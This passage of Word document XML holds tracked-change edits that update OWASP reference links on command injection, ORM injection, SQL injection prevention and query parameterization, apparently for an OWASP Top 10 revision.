            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](https://</w:t>
      </w:r>
      <w:del w:id="1380" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="1381" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1382" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing_for_Command_Injection</w:t>
      </w:r>
      <w:del w:id="1383" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_(OTG-INPVAL-013)),</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1384" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:r w:rsidR="00B74248">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2CE1D32C" w14:textId="28247935" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [ORM </w:t>
      </w:r>
      <w:del w:id="1385" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>injection</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="1386" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Injection </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(https://</w:t>
      </w:r>
      <w:del w:id="1387" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="1388" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1389" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing_for_ORM_Injection</w:t>
      </w:r>
      <w:del w:id="1390" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_(OTG-INPVAL-007))</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1391" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E6F09D6" w14:textId="3629D45D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1392" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1393"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Injection </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Prevention](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="1394" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1395"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1396" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1397" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Injection_Prevention_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="1398" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1399" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="34D94231" w14:textId="5305AC4C" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1400" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1401"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SQL Injection </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Prevention](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="1402" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1403"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1404" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1405" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/SQL_Injection_Prevention_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="1406" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1407" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0DCD1790" w14:textId="78D97B02" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1408" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1409"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Injection Prevention in </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="1410" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1411"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1412" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1413" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Injection_Prevention_Cheat_Sheet_in_Java</w:t>
      </w:r>
      <w:del w:id="1414" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1415" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="100DA6EA" w14:textId="360AFC8A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1416" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1417"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Query </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Parameterization](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="1418" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1419"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1420" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1421" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Query_Parameterization_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="1422" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1423" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="76C909F0" w14:textId="7F0D6983" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1424" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1425"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Automated Threats to Web Applications – OAT-014</w:t>
      </w:r>
      <w:del w:id="1426" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](</w:delText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delInstrText>HYPERLINK "</w:delInstrText>
        </w:r>
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delInstrText>https://www.owasp.org/index.php/OWASP_Automated_Threats_to_Web_Applications</w:delInstrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delInstrText>"</w:delInstrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="008E7F6F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>https://www.owasp.org/index.php/OWASP_Automated_Threats_to_Web_Applications</w:delText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1427" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>](https://owasp.org/www-project-automated-threats-to-web-applications/) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4095D2B5" w14:textId="77777777" w:rsidR="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1428" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6568059E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1429" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1430" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A7:2017 Cross-Site Scripting (XSS)</w:delText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:br/>
        </w:r>
      </w:del>
      <w:ins w:id="1431" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:moveFromRangeStart w:id="1432" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923169"/>
      <w:moveFrom w:id="1433" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## References</w:t>
        </w:r>
      </w:moveFrom>
    </w:p>
    <w:p w14:paraId="62AC5996" w14:textId="77777777" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00B74248" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1434" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:moveFromRangeEnd w:id="1432"/>
    <w:p w14:paraId="53C14FCD" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1435" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1436" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3A1F4071" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1437" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
